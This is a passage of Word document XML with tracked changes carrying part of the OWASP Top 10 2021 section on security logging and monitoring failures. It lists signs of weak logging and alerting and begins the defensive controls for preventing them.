        <w:rPr>
          <w:ins w:id="3209" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3210" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    transactions, are not logged.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="34DECDA6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3211" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="6284376A" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3212" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3213" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Warnings and errors generate no, inadequate, or unclear log</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="054EBCBF" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3214" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3215" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    messages.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="38AB99B1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3216" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A33FEE2" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3217" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3218" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Logs of applications and APIs are not monitored for suspicious</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="27C5E6F0" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3219" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3220" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    activity.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6E395FEC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3221" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2A21DFAA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3222" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3223" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Logs are only stored locally.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="708E4B35" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3224" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1DE810EA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3225" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3226" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   Appropriate alerting thresholds and response escalation processes</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="6ADDA0C5" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3227" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3228" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    are not in place or effective.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="536D9582" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3229" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2E0D8474" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3230" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3231" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Penetration testing and scans by dynamic </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t xml:space="preserve">application </w:t>
      </w:r>
      <w:ins w:id="3232" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>security testing (DAST) tools (such as OWASP ZAP) do</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="579F2304" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3233" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3234" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    not trigger alerts.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0F0F383B" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3235" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="55ECF8DD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3236" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3237" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-   The application cannot detect, escalate, or alert for active attacks</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7F14106C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3238" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3239" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    in real-time or near real-time.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3FC6ECC8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:moveTo w:id="3240" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveToRangeStart w:id="3241" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z" w:name="move137923177"/>
    </w:p>
    <w:p w14:paraId="4D767DB6" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3242" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:moveTo w:id="3243" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">You are </w:t>
        </w:r>
      </w:moveTo>
      <w:moveToRangeEnd w:id="3241"/>
      <w:ins w:id="3244" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>vulnerable to information leakage by making logging and alerting</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="55C18CC7" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3245" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3246" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">events visible to a user or an attacker (see [A01:2021-Broken Access </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>Control](</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>A01_2021-Broken_Access_Control.md)).</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7D428A14" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3247" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7CB80EA8" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3248" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3249" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">## How to Prevent </w:t>
        </w:r>
        <w:proofErr w:type="gramStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">{{ </w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="gramEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>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 ".how to prevent", id=id ~ "-</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>how_to_prevent</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>", name=title ~ ": How to Prevent", lang=lang, source=source ~ "#" ~ id, parent=</w:t>
        </w:r>
        <w:proofErr w:type="spellStart"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>osib</w:t>
        </w:r>
        <w:proofErr w:type="spellEnd"/>
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>) }}</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="3C174ABA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3250" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="649A999C" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3251" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3252" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">Developers should implement some or all the following controls, </w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="1A03DFEC" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3253" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3254" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>depending on the risk of the application:</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="21B229F1" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3255" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4AFFC7C9" w14:textId="345B5257" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3256" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3257" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Ensure all login, access control, and </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>server</w:t>
      </w:r>
      <w:del w:id="3258" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:delText xml:space="preserve">, database </w:delText>
        </w:r>
      </w:del>
      <w:ins w:id="3259" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t>-side input validation</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="51A03D90" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3260" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3261" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    failures can be logged with sufficient user context to identify</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="0B66AB76" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3262" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3263" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    suspicious or malicious accounts and held for enough time to allow</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="7CCC81CA" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3264" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3265" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">    delayed forensic analysis.</w:t>
        </w:r>
      </w:ins>
    </w:p>
    <w:p w14:paraId="4C9C1DDD" w14:textId="77777777" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:ins w:id="3266" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z"/>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="1C328E50" w14:textId="2E7293BF" w:rsidR="00841D1E" w:rsidRPr="00841D1E" w:rsidRDefault="00841D1E" w:rsidP="00841D1E">
      <w:pPr>
        <w:spacing w:after="0"/>
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
      </w:pPr>
      <w:ins w:id="3267" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidRPr="00841D1E">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
          <w:t xml:space="preserve">-   Ensure that logs are generated in a format that log </w:t>
        </w:r>
      </w:ins>
      <w:r w:rsidRPr="00841D1E">
        <w:rPr>
          <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
          <w:lang w:val="en-US"/>
        </w:rPr>
        <w:t>management</w:t>
      </w:r>
      <w:del w:id="3268" w:author="Top10_2021" w:date="2023-06-17T19:39:00Z">
        <w:r w:rsidR="00E13797" w:rsidRPr="00E13797">
          <w:rPr>
            <w:rFonts w:ascii="Arial" w:hAnsi="Arial" w:cs="Arial"/>
            <w:lang w:val="en-US"/>
          </w:rPr>
